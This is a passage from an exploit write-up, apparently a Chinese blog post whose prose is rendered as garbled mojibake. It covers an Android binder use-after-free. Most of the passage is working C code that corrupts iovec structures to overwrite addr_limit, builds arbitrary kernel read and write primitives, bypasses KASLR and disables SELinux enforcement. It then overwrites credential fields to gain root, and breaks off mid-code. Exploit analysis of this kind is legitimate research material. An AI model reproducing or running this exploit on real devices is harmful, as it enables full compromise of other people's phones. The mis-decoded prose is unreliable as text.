</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0x41414141</span><span class=p>,</span>             <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>,</span>  <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                        <span class=n>OFFSET_TASK_STRUCT_ADDR_LIMIT</span><span class=p>),</span> <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0xFFFFFFFFFFFFFFFE</span>      <span class=c1>// addr_limit value
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Prepare the message
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>message</span><span class=p>.</span><span class=n>msg_iov</span> <span class=o>=</span> <span class=n>iovecStack</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>message</span><span class=p>.</span><span class=n>msg_iovlen</span> <span class=o>=</span> <span class=n>IOVEC_COUNT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Now link the poll wait queue to binder thread wait queue
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>linkEventPollWaitQueueToBinderThreadWaitQueue</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We should trigger the unlink operation when we
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// have the binder_thread reallocated as iovec array
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// Now fork
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>pid_t</span> <span class=n>childPid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>childPid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// child process
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// There is a race window between the unlink and blocking
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// in writev, so sleep for a while to ensure that we are
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// blocking in writev before the unlink happens
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// Trigger the unlink operation on the reallocated chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>unlinkEventPollWaitQueueFromBinderThreadWaitQueue</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// Write rest of the data to the socket so that recvmsg starts
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// processing the corrupted iovecs and we get scoped write and
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// finally arbitrary write
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>write</span><span class=p>(</span><span class=n>sock_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>finalSocketData</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>finalSocketData</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>finalSocketData</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx&#34;</span><span class=p>,</span> <span class=n>nBytesWritten</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>finalSocketData</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_SUCCESS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// parent process
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// I have seen some races which hinders the reallocation.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// So, now freeing the binder_thread after fork.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>freeBinderThread</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Reallocate binder_thread as iovec array and
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// we need to make sure this recvmsg call blocks.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// recvmsg will block after processing a valid iovec at
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// iovecStack[IOVEC_WQ_INDEX]
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>ssize_t</span> <span class=n>nBytesReceived</span> <span class=o>=</span> <span class=n>recvmsg</span><span class=p>(</span><span class=n>sock_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>message</span><span class=p>,</span> <span class=n>MSG_WAITALL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// If the corruption was successful, the total bytes received
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// should be equal to length of all iovec. This is because there
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// are three valid iovec
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>ssize_t</span> <span class=n>expectedBytesReceived</span> <span class=o>=</span> <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                                    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                                    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>nBytesReceived</span> <span class=o>!=</span> <span class=n>expectedBytesReceived</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nBytesReceived</span><span class=p>,</span> <span class=n>expectedBytesReceived</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Wait for the child process to exit
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>wait</span><span class=p>(</span><span class=n>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œå°±è¦å°†addr_limitçš„å€¼æ”¹ä¸º<code>0xFFFFFFFFFFFFFFFE</code>åœ¨arm64é‡Œæœ‰ä¸ªæ£€æŸ¥å‡½æ•°<code>do_page_fault</code>ä¼šæ£€æµ‹è¯¥å€¼æ˜¯å¦ä¸º<code>0xFFFFFFFFFFFFFFFF</code>ï¼Œå¦‚æœæ˜¯å°±è§¦å‘å¥”æºƒï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½è®¾ä¸º<code>0xFFFFFFFFFFFFFFFE</code>ã€‚</p><p>å‰é¢æ˜¯ä»å†…æ ¸è¯»å‡ºæ•°æ®ï¼Œè¿™é‡Œè¦å®ç°çš„æ˜¯å‘å†…æ ¸å†™å…¥æ•°æ®ã€‚</p><p>çœ‹çœ‹è¿™é‡Œçš„iovecStackç»“æ„ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>m_4gb_aligned_page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x41414141</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x42424242</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mh>0x8</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>å’Œå‰é¢æ³„éœ²ä¿¡æ¯çš„å¸ƒå±€æ˜¯å·®ä¸å¤šã€‚</p><p>é¦–å…ˆä¾ç„¶æ˜¯åˆå§‹åŒ–ç¯å¢ƒï¼Œå…ˆå‘socketå†™å…¥äº†1byteçš„åƒåœ¾æ•°æ®ï¼Œä¹‹åçˆ¶è¿›ç¨‹ä½¿ç”¨<code>recvmsg</code>ç³»ç»Ÿè°ƒç”¨æ¥æ”¶äº†1byteçš„æ•°æ®ä¹‹åè¿›è¡Œé˜»å¡ï¼Œè¿™é‡Œé€‰ç”¨äº†recvmsgè€Œä¸æ˜¯å‰é¢writevæ˜¯å› ä¸ºiovecStack[10].iov_lenå˜æˆäº†ä¸€ä¸ªæŒ‡é’ˆï¼Œå¾ˆå¤§çš„æ•°å­—ï¼Œåç»­è°ƒç”¨copy_page_to_iter_iovecå¤åˆ¶æ•°æ®æ—¶ä¼šå‡ºé”™ã€‚</p><p>å­è¿›ç¨‹è¿›è¡Œunlinkæ“ä½œï¼Œå°†ç²¾å¿ƒæ„é€ çš„finalSocketDataå†™å…¥socketï¼Œçˆ¶è¿›ç¨‹æ¢å¤æ¥æ”¶æ•°æ®ï¼Œè¿™æ—¶iovecStack[11]å·²ç»è¢«ç ´åæ‰äº†ï¼Œç­‰åˆ°recvmsgç³»ç»Ÿè°ƒç”¨è¿”å›æ—¶ï¼Œå°±å¯ä»¥ä¿®æ”¹æ‰addr_limitçš„å€¼ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>uint64_t</span> <span class=n>finalSocketData</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=mh>0x1</span><span class=p>,</span>                    <span class=c1>// iovecStack[IOVEC_WQ_INDEX].iov_len
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0x41414141</span><span class=p>,</span>             <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>,</span>  <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                        <span class=n>OFFSET_TASK_STRUCT_ADDR_LIMIT</span><span class=p>),</span> <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0xFFFFFFFFFFFFFFFE</span>      <span class=c1>// addr_limit value
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>å¯¹åº”ä¸Šé¢çš„å€¼ã€‚</p><p>åˆ°è¿™é‡Œæˆ‘ä»¬å°±æœ‰äº†å®Œæ•´çš„å†…æ ¸è¯»å†™æƒé™ï¼Œæ¥ä¸‹ç»•è¿‡kaslrã€ç¦ç”¨SElinuxã€patchCredå°±å¯ä»¥è·å¾—rootæƒé™ã€‚</p><h4 id=bypass-kaslr-and-disabling-selinux>bypass kaslr and Disabling SELinux</h4><p>å‰é¢å·²ç»äº†æœ‰äº†å®Œæ•´çš„è¯»å†™æƒé™ï¼Œé‚£è¿™å°±å¾ˆç®€å•äº†ã€‚</p><p>ä»»æ„è¯»å†™çš„å®ç°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span> <span class=n>BinderUaF</span><span class=o>::</span><span class=n>kRead</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>Address</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>Length</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>uBuffer</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>write</span><span class=p>(</span><span class=n>m_kernel_rw_pipe_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>Address</span><span class=p>,</span> <span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>size_t</span><span class=p>)</span> <span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=n>Length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;[-] Failed to write data from kernel: %p&#34;</span><span class=p>,</span> <span class=n>Address</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesRead</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>m_kernel_rw_pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>uBuffer</span><span class=p>,</span> <span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>size_t</span><span class=p>)</span> <span class=n>nBytesRead</span> <span class=o>!=</span> <span class=n>Length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;[-] Failed to read data from kernel: %p&#34;</span><span class=p>,</span> <span class=n>Address</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=n>BinderUaF</span><span class=o>::</span><span class=n>kWrite</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>Address</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>Length</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>uBuffer</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>write</span><span class=p>(</span><span class=n>m_kernel_rw_pipe_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>uBuffer</span><span class=p>,</span> <span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>size_t</span><span class=p>)</span> <span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=n>Length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;[-] Failed to write data from user: %p&#34;</span><span class=p>,</span> <span class=n>Address</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesRead</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>m_kernel_rw_pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>Address</span><span class=p>,</span> <span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>size_t</span><span class=p>)</span> <span class=n>nBytesRead</span> <span class=o>!=</span> <span class=n>Length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;[-] Failed to write data to kernel: %p&#34;</span><span class=p>,</span> <span class=n>Address</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ä»»æ„è¯»çš„è¯ï¼Œåˆ©ç”¨writeå’Œreadä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä½¿ç”¨writeå°†æ•°æ®å†™åˆ°pipeï¼Œå¹¶åœ¨ç®¡é“çš„å¦ä¸€ç«¯readä¸€ä¸ªå†…æ ¸åœ°å€ï¼Œå°±å¯ä»¥å°†æ•°æ®å†™å…¥è¯¥å†…æ ¸åœ°å€ã€‚ä»»æ„å†™çš„è¯ï¼Œä¸ä¹‹ç›¸åã€‚è¿™æ ·å°±å®ç°äº†ä»»æ„è¯»å†™ã€‚</p><p>task_struct æœ‰ä¸€ä¸ªå…¨å±€æŒ‡é’ˆnsproxy ï¼Œå‰é¢å·²ç»æ³„éœ²å‡ºæ¥äº†ï¼Œå°±å¯ä»¥æ›´å…·åç§»ç›´æ¥ç®—å‡ºKernel_base_addrã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=n>ptrdiff_t</span> <span class=n>kernelBase</span> <span class=o>=</span> <span class=n>nsProxy</span> <span class=o>-</span> <span class=n>SYMBOL_OFFSET_init_nsproxy</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>auto</span> <span class=n>selinuxEnforcing</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>(</span><span class=n>kernelBase</span> <span class=o>+</span> <span class=n>SYMBOL_OFFSET_selinux_enforcing</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] nsproxy: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nsProxy</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Kernel base: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>kernelBase</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] selinux_enforcing: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>selinuxEnforcing</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>selinuxEnabled</span> <span class=o>=</span> <span class=n>kReadDword</span><span class=p>(</span><span class=n>selinuxEnforcing</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>selinuxEnabled</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] selinux enforcing is disabled</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] selinux enforcing is enabled</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>(</span><span class=n>selinuxEnforcing</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œåªéœ€è¦å¯¹äºSELinuxåªéœ€æ ¹æ®kernelBase è®¡ç®—å‡ºå…·ä½“çš„åœ°å€ï¼Œå†ç›´æ¥è¿›è¡Œå†™å…¥0x0å³å¯ç¦ç”¨æ‰ã€‚</p><p>ç°åœ¨çš„ç‰ˆæœ¬è¶Šæ¥è¶Šå¤šä¿æŠ¤å’Œæ£€æŸ¥æœºåˆ¶ï¼Œå®é™…ä¸Šç›´æ¥è¿™æ ·ä¸ä¸€å®šæ˜¯ä¸å¯è¡Œï¼Œæœ‰æ—¶å¾—æ¢å¤kallsymsè¡¨æ‰è¡Œ</p><h4 id=root>Root</h4><p>ææƒçš„å¸¸ç”¨è¯­å¥<code>commit_creds(prepare_kernel_cred(NULL));</code>ï¼Œè¿™å°±æ˜¯å¸¸è§„çš„å¥—è·¯äº†ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>uid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_UID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>gid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_GID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>suid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_UID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>sgid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_GID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>euid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_UID</span><span class=p>);</span>
